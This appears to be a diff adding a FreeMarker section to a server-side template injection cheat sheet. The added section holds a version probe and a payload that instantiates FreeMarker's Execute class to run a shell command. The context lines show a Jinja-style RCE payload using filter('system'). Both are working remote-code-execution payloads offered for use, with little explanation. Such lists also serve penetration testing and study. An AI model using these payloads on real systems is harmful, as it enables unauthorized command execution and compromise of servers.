@@ -39,3 +39,9 @@ I.e: Sending this ipout ${7*7}, if the answer is this 7777777 is a Jinja Templat
 # RCE
 {{ ['id'] | filter('system') }}
 ```
+
+## FreeMarker Exploit (java)
+```
+${.version}
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
+```
